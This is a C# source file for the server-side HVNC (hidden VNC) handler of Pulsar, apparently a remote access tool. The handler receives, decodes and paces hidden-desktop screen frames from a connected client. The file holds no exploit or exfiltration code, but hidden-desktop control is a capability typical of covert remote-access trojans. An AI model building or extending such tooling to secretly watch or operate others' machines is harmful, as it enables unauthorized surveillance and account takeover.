using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Networking;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using Pulsar.Common.Messages.Monitoring.HVNC;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote desktop.
    /// </summary>
    public class HVNCHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming desktop frames.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Gets or sets whether the remote desktop is using buffered mode.
        /// </summary>
        public bool IsBufferedMode { get; set; } = true;

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _sizeLock = new object();

        /// <summary>
        /// The local resolution, see <seealso cref="LocalResolution"/>.
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
        /// </summary>
        /// <remarks>
        /// This property is thread-safe.
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        /// <summary>
        /// Represents the method that will handle display changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="value">All currently available displays.</param>
        public delegate void DisplaysChangedEventHandler(object sender, int value);

        /// <summary>
        /// The client which is associated with this remote desktop handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The video stream codec used to decode received frames.
        /// </summary>
        private UnsafeStreamCodec _codec;

        // buffer parameters
        private readonly int _initialFramesRequested = 5; // request 5 frames initially
        private readonly int _defaultFrameRequestBatch = 3; // request 3 frames at a time now on
        private int _pendingFrames = 0;
        private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();
        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
        private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames

        private readonly Stopwatch _performanceMonitor = new Stopwatch();
        private int _framesReceived = 0;
        private double _estimatedFps = 0;        /// <summary>
        /// Stores the last FPS reported by the client.
        /// </summary>
        private float _lastReportedFps = -1f;

        /// <summary>
        /// Shows the last FPS reported by the client, or estimated FPS if not available.
        /// </summary>
        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;

        /// <summary>
        /// Shows the estimated frames per second (FPS) based on the last second of received frames.
        /// </summary>
        public float LastReportedFps => _lastReportedFps;

        public static Size resolution = new Size(0, 0);

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public HVNCHandler(Client client) : base(true)
        {
            _client = client;
            _performanceMonitor.Start();
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetHVNCDesktopResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetHVNCDesktopResponse response:
                    Execute(sender, response);
                    break;
            }
        }

        private async void Execute(ISender client, GetHVNCDesktopResponse message)
        {
            _framesReceived++;

            resolution = new Size { Height = message.Resolution.Height, Width = message.Resolution.Width };

            // capture the FPS reported by the client
            if (message.Fps > 0)
            {
                _lastReportedFps = message.Fps;
                Debug.WriteLine($"Client-reported FPS: {_lastReportedFps}");
            }

            if (_performanceMonitor.ElapsedMilliseconds >= 1000)
            {
                _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
                Debug.WriteLine($"Estimated FPS: {_estimatedFps:F1}, Frames received: {_framesReceived}");
                _framesReceived = 0;
                _performanceMonitor.Restart();
            }

            lock (_syncLock)
            {
                if (!IsStarted)
                    return;

                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                }

                using (MemoryStream ms = new MemoryStream(message.Image))
                {
                    try
                    {
                        // create deep copy & resize bitmap to local resolution
                        OnReport(new Bitmap(_codec.DecodeData(ms), LocalResolution));
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
                    }
                }

                message.Image = null;

                long timestamp = message.Timestamp;
                _frameTimestamps.Enqueue(timestamp);
                while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }

                Interlocked.Decrement(ref _pendingFrames);
            }

            if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 1))
            {
                await RequestMoreFramesAsync();
            }
        }

        private void ClearTimeStamps()
        {
            while (_frameTimestamps.TryDequeue(out _)) { }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="quality">The quality of the remote desktop frames.</param>
        /// <param name="display">The display to receive frames from.</param>
        /// <param name="useGPU">Whether to use GPU for screen capture.</param>
        public void BeginReceiveFrames(int quality, int display, bool useGPU)
        {
            lock (_syncLock)
            {
                IsStarted = true;
                _codec?.Dispose();
                _codec = null;

                // Reset buffering counters
                _pendingFrames = _initialFramesRequested;
                ClearTimeStamps();
                _framesReceived = 0;
                _frameReceiptStopwatch.Restart();

                // Start in buffered mode
                _client.Send(new GetHVNCDesktop
                {
                    CreateNew = true,
                    Quality = quality,
                    DisplayIndex = display,
                    Status = RemoteDesktopStatus.Start,
                    UseGPU = useGPU,
                    IsBufferedMode = IsBufferedMode,
                    FramesRequested = _initialFramesRequested
                });
            }
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
            }

            Debug.WriteLine("HVNC session stopped");

            _client.Send(new GetHVNCDesktop { Status = RemoteDesktopStatus.Stop });
        }

        private async Task RequestMoreFramesAsync()
        {
            if (!await _frameRequestSemaphore.WaitAsync(0))
                return;

            try
            {
                int batchSize = 5;

                Debug.WriteLine($"Requesting {batchSize} more frames");
                Interlocked.Add(ref _pendingFrames, batchSize);

                _client.Send(new GetHVNCDesktop
                {
                    CreateNew = false,
                    Quality = _codec?.ImageQuality ?? 75,
                    DisplayIndex = _codec?.Monitor ?? 0,
                    Status = RemoteDesktopStatus.Continue,
                    IsBufferedMode = true,
                    FramesRequested = batchSize
                });
            }
            finally
            {
                _frameRequestSemaphore.Release();
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    _frameRequestSemaphore?.Dispose();
                    IsStarted = false;
                }
            }
        }
    }
}
